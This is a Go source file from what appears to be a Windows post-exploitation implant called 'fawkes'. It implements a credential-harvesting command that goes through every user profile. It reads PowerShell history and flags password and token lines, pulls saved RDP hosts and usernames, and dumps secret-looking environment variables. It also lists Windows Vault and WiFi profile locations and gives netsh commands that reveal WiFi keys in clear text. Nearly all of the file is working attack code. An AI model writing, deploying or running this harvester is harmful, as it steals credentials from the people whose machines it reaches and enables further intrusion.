//go:build windows

package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
	switch strings.ToLower(args.Action) {
	case "cloud":
		return credCloud(args)
	case "configs":
		return credConfigs(args)
	case "windows":
		return credWindows(args)
	case "all":
		return credAllWindows(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: cloud, configs, windows, all", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

func credWindows(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	sb.WriteString("Windows Credential Sources\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	// PowerShell history
	sb.WriteString("--- PowerShell History ---\n")
	psFound := false
	for _, home := range homes {
		psHistoryPath := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt")
		info, err := os.Stat(psHistoryPath)
		if err != nil {
			continue
		}
		psFound = true
		sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", psHistoryPath, info.Size()))

		if data, err := os.ReadFile(psHistoryPath); err == nil {
			lines := strings.Split(strings.TrimRight(string(data), "\r\n"), "\n")
			// Show last 50 lines, highlight credential-related commands
			start := 0
			if len(lines) > 50 {
				start = len(lines) - 50
				sb.WriteString(fmt.Sprintf("  (%d total lines, showing last 50)\n", len(lines)))
			}
			for _, line := range lines[start:] {
				line = strings.TrimRight(line, "\r")
				lower := strings.ToLower(line)
				// Flag credential-related commands
				if strings.Contains(lower, "password") || strings.Contains(lower, "credential") ||
					strings.Contains(lower, "secret") || strings.Contains(lower, "token") ||
					strings.Contains(lower, "convertto-securestring") || strings.Contains(lower, "get-credential") ||
					strings.Contains(lower, "invoke-command") || strings.Contains(lower, "enter-pssession") ||
					strings.Contains(lower, "new-pssession") || strings.Contains(lower, "-credential") {
					sb.WriteString(fmt.Sprintf("  >>> %s\n", line))
				} else {
					sb.WriteString(fmt.Sprintf("      %s\n", line))
				}
			}
		}
	}
	if !psFound {
		sb.WriteString("  (no PowerShell history found)\n")
	}

	// RDP connection history (saved connections)
	sb.WriteString("\n--- RDP Saved Connections ---\n")
	rdpFound := false
	for _, home := range homes {
		rdpPath := filepath.Join(home, "Documents", "Default.rdp")
		if info, err := os.Stat(rdpPath); err == nil {
			rdpFound = true
			sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", rdpPath, info.Size()))
			if data, err := os.ReadFile(rdpPath); err == nil {
				for _, line := range strings.Split(string(data), "\n") {
					line = strings.TrimRight(line, "\r")
					if strings.HasPrefix(line, "full address") || strings.HasPrefix(line, "username") {
						sb.WriteString(fmt.Sprintf("    %s\n", line))
					}
				}
			}
		}
	}
	if !rdpFound {
		sb.WriteString("  (no saved .rdp files found)\n")
	}

	// Credential-related environment variables
	sb.WriteString("\n--- Sensitive Environment Variables ---\n")
	envFound := false
	sensitiveEnvPatterns := []string{
		"PASSWORD", "SECRET", "TOKEN", "API_KEY", "APIKEY",
		"CREDENTIAL", "AUTH", "ACCESS_KEY", "PRIVATE_KEY",
		"CONNECTION_STRING", "CONN_STR", "DATABASE_URL",
	}
	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) != 2 {
			continue
		}
		name := strings.ToUpper(parts[0])
		value := parts[1]
		for _, pattern := range sensitiveEnvPatterns {
			if strings.Contains(name, pattern) {
				envFound = true
				display := value
				if len(display) > 60 {
					display = display[:25] + "..." + display[len(display)-15:]
				}
				sb.WriteString(fmt.Sprintf("  %s=%s\n", parts[0], display))
				break
			}
		}
	}
	if !envFound {
		sb.WriteString("  (no sensitive environment variables found)\n")
	}

	// WiFi profiles (saved passwords)
	sb.WriteString("\n--- WiFi Profile Locations ---\n")
	wifiDir := `C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces`
	if info, err := os.Stat(wifiDir); err == nil && info.IsDir() {
		entries, _ := os.ReadDir(wifiDir)
		if len(entries) > 0 {
			sb.WriteString(fmt.Sprintf("  [DIR] %s (%d interface(s))\n", wifiDir, len(entries)))
			sb.WriteString("  Note: Use 'netsh wlan show profiles' + 'netsh wlan show profile name=X key=clear' to extract\n")
		} else {
			sb.WriteString("  (no WiFi profiles found)\n")
		}
	} else {
		sb.WriteString("  (WiFi not available or profiles inaccessible)\n")
	}

	// Windows Vault (Web Credentials)
	sb.WriteString("\n--- Windows Vault Locations ---\n")
	for _, home := range homes {
		vaultDir := filepath.Join(home, "AppData", "Local", "Microsoft", "Vault")
		if info, err := os.Stat(vaultDir); err == nil && info.IsDir() {
			sb.WriteString(fmt.Sprintf("  [DIR] %s\n", vaultDir))
			entries, _ := os.ReadDir(vaultDir)
			for _, e := range entries {
				if e.IsDir() {
					sb.WriteString(fmt.Sprintf("    Vault: %s\n", e.Name()))
				}
			}
			sb.WriteString("  Note: Use 'credman' command for detailed credential enumeration\n")
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func credAllWindows(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder

	windows := credWindows(args)
	sb.WriteString(windows.Output)
	sb.WriteString("\n")

	cloud := credCloud(args)
	sb.WriteString(cloud.Output)
	sb.WriteString("\n")

	configs := credConfigs(args)
	sb.WriteString(configs.Output)

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

// getUserHomes returns user home directories on Windows
func getUserHomes(filterUser string) []string {
	var homes []string

	// Try Users directory
	usersDir := `C:\Users`
	entries, err := os.ReadDir(usersDir)
	if err != nil {
		if home, err := os.UserHomeDir(); err == nil {
			return []string{home}
		}
		return nil
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()

		// Skip system profiles
		if name == "Public" || name == "Default" || name == "Default User" || name == "All Users" {
			continue
		}

		if filterUser != "" && !strings.Contains(strings.ToLower(name), strings.ToLower(filterUser)) {
			continue
		}

		home := filepath.Join(usersDir, name)
		homes = append(homes, home)
	}

	return homes
}
